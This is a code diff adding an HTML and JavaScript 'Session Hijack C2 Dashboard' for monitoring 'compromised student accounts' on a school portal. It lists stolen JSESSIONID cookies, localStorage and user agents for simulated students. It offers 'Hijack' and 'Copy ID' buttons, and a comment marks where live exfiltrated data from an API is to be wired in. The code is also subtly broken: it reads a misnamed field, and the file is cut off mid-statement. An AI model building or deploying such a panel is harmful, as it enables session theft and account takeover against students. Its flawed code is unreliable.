@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Hijack C2 Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; }
+        
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        
+        header {
+            background: linear-gradient(135deg, #1a1f2e 0%, #0d1117 100%);
+            padding: 20px;
+            border-bottom: 2px solid #ff00cc;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        
+        header h1 {
+            font-size: 2em;
+            color: #ff00cc;
+            text-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+        }
+        
+        header p { color: #888; margin-top: 5px; }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: #1a1f2e;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #00ffcc;
+        }
+        
+        .stat-card h3 { font-size: 0.9em; color: #888; margin-bottom: 5px; }
+        .stat-card .value { font-size: 1.8em; color: #00ffcc; font-weight: bold; }
+        
+        .user-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .user-card {
+            background: #1a1f2e;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #2a2f3e;
+            transition: transform 0.2s;
+        }
+        
+        .user-card:hover { transform: translateY(-2px); border-color: #ff00cc; }
+        
+        .user-header {
+            background: linear-gradient(135deg, #ff00cc 0%, #3333ff 100%);
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .user-name { font-size: 1.3em; font-weight: bold; color: white; }
+        .user-status {
+            background: rgba(255,255,255,0.2);
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.8em;
+        }
+        
+        .user-body { padding: 15px; }
+        
+        .session-id {
+            background: #0a0e17;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            word-break: break-all;
+            margin-bottom: 15px;
+            border: 1px solid #2a2f3e;
+        }
+        
+        .session-id label { color: #888; display: block; margin-bottom: 5px; font-size: 0.75em; }
+        .session-id span { color: #00ffcc; }
+        
+        .data-section { margin-bottom: 15px; }
+        .data-section h4 {
+            font-size: 0.85em;
+            color: #ff00cc;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .data-item {
+            background: #0a0e17;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 5px;
+            font-size: 0.8em;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+        
+        .data-item .label { color: #888; }
+        .data-item .value { color: #e0e0e0; }
+        
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+        
+        .btn-hijack { background: #ff00cc; color: white; }
+        .btn-hijack:hover { background: #ff33dd; }
+        
+        .btn-copy { background: #3333ff; color: white; }
+        .btn-copy:hover { background: #5555ff; }
+        
+        .btn-details { background: #00ffcc; color: #0a0e17; }
+        .btn-details:hover { background: #33ffdd; }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal.active { display: flex; }
+        
+        .modal-content {
+            background: #1a1f2e;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            border: 2px solid #ff00cc;
+        }
+        
+        .modal-content h2 { color: #ff00cc; margin-bottom: 20px; }
+        .modal-content pre {
+            background: #0a0e17;
+            padding: 15px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .close-modal {
+            float: right;
+            cursor: pointer;
+            font-size: 1.5em;
+            color: #888;
+        }
+        
+        .close-modal:hover { color: #fff; }
+        
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #888;
+        }
+        
+        .empty-state h2 { color: #ff00cc; margin-bottom: 10px; }
+        
+        .log-section {
+            background: #1a1f2e;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+        
+        .log-section h3 { color: #00ffcc; margin-bottom: 10px; }
+        .log-entry {
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            padding: 5px 0;
+            border-bottom: 1px solid #2a2f3e;
+        }
+        .log-entry:last-child { border-bottom: none; }
+        .log-time { color: #888; }
+        .log-msg { color: #e0e0e0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎯 Session Hijack C2 Dashboard</h1>
+            <p>Real-time monitoring of compromised student accounts</p>
+        </header>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Active Sessions</h3>
+                <div class="value" id="statActive">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Total Users</h3>
+                <div class="value" id="statTotal">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Data Points</h3>
+                <div class="value" id="statData">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Last Update</h3>
+                <div class="value" id="statLast" style="font-size:1em;">Never</div>
+            </div>
+        </div>
+        
+        <div id="userGrid" class="user-grid">
+            <div class="empty-state">
+                <h2>No Active Sessions</h2>
+                <p>Waiting for exfiltrated data from compromised accounts...</p>
+            </div>
+        </div>
+        
+        <div class="log-section">
+            <h3>📋 Activity Log</h3>
+            <div id="logContainer"></div>
+        </div>
+    </div>
+    
+    <div id="detailsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <h2 id="modalTitle">User Details</h2>
+            <pre id="modalContent"></pre>
+        </div>
+    </div>
+    
+    <script>
+        // State management
+        let users = {};
+        let logs = [];
+        
+        // Simulated data for testing - replace with actual API calls
+        const simulatedData = [
+            {
+                name: "Alice Johnson",
+                jsessionId: "JSESSIONID=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz",
+                url: "https://portal.school.edu/dashboard",
+                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                timestamp: new Date().toISOString(),
+                localStorage: { "studentId": "STU2024001", "prefTheme": "dark" },
+                cookies: "JSESSIONID=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz; theme=dark"
+            },
+            {
+                name: "Bob Smith",
+                jsessionId: "JSESSIONID=zzz999yyy888xxx777www666vvv555uuu444ttt333sss222rrr111qqq",
+                url: "https://portal.school.edu/grades",
+                userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+                timestamp: new Date().toISOString(),
+                localStorage: { "studentId": "STU2024042", "lastCourse": "MATH101" },
+                cookies: "JSESSIONID=zzz999yyy888xxx777www666vvv555uuu444ttt333sss222rrr111qqq; lang=en"
+            }
+        ];
+        
+        // Initialize
+        function init() {
+            // In production, replace this with:
+            // fetch('/api/sessions').then(r => r.json()).then(data => processUsers(data));
+            simulatedData.forEach(data => processUser(data));
+            updateStats();
+        }
+        
+        function processUser(data) {
+            const key = data.jsessionid;
+            const existing = users[key];
+            
+            users[key] = {
+                name: data.name || 'Unknown',
+                jsessionId: data.jsessionid,
+                url: data.url,
+                userAgent: data.userAgent,
+                timestamp: data.timestamp,
+                localStorage: data.localStorage || {},
+                cookies: data.cookies || '',
+                firstSeen: existing?.firstSeen || data.timestamp,
+                lastSeen: data.timestamp,
+                sessionCount: (existing?.sessionCount || 0) + 1
+            };
+            
+            addLog(`Session received: ${data.name} (${data.jsessionid.substring(0, 20)}...)`);
+            renderUser(users[key]);
+            updateStats();
+        }
+        
+        function renderUser(user) {
+            const grid = document.getElementById('userGrid');
+            const existingCard = document.getElementById(`user-${user.jsessionid.replace(/[^a-zA-Z0-9]/g, '')}`);
+            
+            if (existingCard) {
+                existingCard.remove();
+            }
+            
+            // Remove empty state if we have users
+            const emptyState = grid.querySelector('.empty-state');
+            if (emptyState && Object.keys(users).length > 0) {
+                emptyState.remove();
+            }
+            
+            const cardId = `user-${user.jsessionid.replace(/[^a-zA-Z0-9]/g, '')}`;
+            const card = document.createElement('div');
+            card.className = 'user-card';
+            card.id = cardId;
+            
+            const timeAgo = getTimeAgo(user.lastSeen);
+            
+            card.innerHTML = `
+                <div class="user-header">
+                    <div class="user-name">${escapeHtml(user.name)}</div>
+                    <div class="user-status">${timeAgo}</div>
+                </div>
+                <div class="user-body">
+                    <div class="session-id">
+                        <label>JSESSIONID</label>
+                        <span>${escapeHtml(user.jsessionid)}</span>
+                    </div>
+                    
+                    <div class="data-section">
+                        <h4>Session Data</h4>
+                        <div class="data-item">
+                            <span class="label">URL:</span>
+                            <span class="value">${escapeHtml(user.url)}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="label">User Agent:</span>
+                            <span class="value">${escapeHtml(user.userAgent)}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="label">Sessions:</span>
+                            <span class="value">${user.sessionCount}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="actions">
+                        <button class="btn btn-hijack" onclick="hijackSession('${cardId}')">🎯 Hijack</button>
+                        <button class="btn btn-copy" onclick="copySessionId('${cardId}')">📋 Copy ID</button>
+                        <button class="btn btn-details" onclick="showDetails('${cardId}')">📊 Details</button>
+                    </div>
+                </div>
+            `;
+            
+            grid.appendChild(card);
+        }
+        
+        function hijackSession(cardId) {
+            const card = document.getElementById(cardId);
+            const sessionId = card.querySelector('.session-id span').textContent;
+            const name = card.querySelector('.user-name').textContent;
+            
+            // In production, this would make authenticated requests using the session ID
+            addLog(`Hijacking session for ${name}...`);
+            
+            // Simulate hijack
+            setTimeout(() => {
+                addLog(`✓ Session hijacked for ${name}. Active as: ${name}`);
+                alert(`Session hijacked for ${name}!\n\nJSESSIONID: ${sessionId}\n\nYou can now use this session ID to make authenticated requests to the school portal.`);
+            }, 500);
+        }
+        
+        function copySessionId(cardId) {
+            const card = document.getElementById(cardId);
+            const sessionId = card.querySelector('.session-id span').textContent;
+            navigator.clipboard.writeText(sessionId).then(() => {
+                addLog(`Copied session ID for ${card.querySelector('.user-name').textContent}`);
+            });
+        }
+        
+        function showDetails(cardId) {
+            const card = document.getElementById(cardId);
+            const user = users[card.querySelector('.session-id span').textContent];
+            
+            document.getElementById('modalTitle').textContent = `Details: ${user.name}`;
+            document.getElementById('modalContent').textContent = JSON.stringify(user, null, 2);
+            document.getElementById('detailsModal').classList.add('active');
+        }
+        
+        function closeModal() {
+            document.getElementById('detailsModal').classList.remove('active');
+        }
+        
+        function updateStats() {
+            const userCount = Object.keys(users).length;
+            const dataPoints = Object.values(users).reduce((sum, u)
